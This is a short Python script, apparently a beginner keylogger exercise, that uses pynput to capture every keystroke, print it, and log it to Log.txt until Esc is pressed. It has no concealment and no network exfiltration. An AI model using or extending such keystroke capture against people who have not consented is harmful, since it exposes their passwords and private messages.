from pynput.keyboard import Key, Listener

keys=[]

# analysis of  the keystrokes
def on_press(key):
    keys.append(key)
    writing_in_file(keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        print('Special key {0} pressed'.format(key))

# writing into a txt file
def writing_in_file(keys):
    with open('Log.txt','w') as f:
        for key in keys:
                k=str(key).replace("'","")
                f.write(f'\n {k}')

                f.write(' ')

#analsis of the key released
def on_release(key):
    print('Released {0}'.format(key))
    if key==Key.esc:
        return False


with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()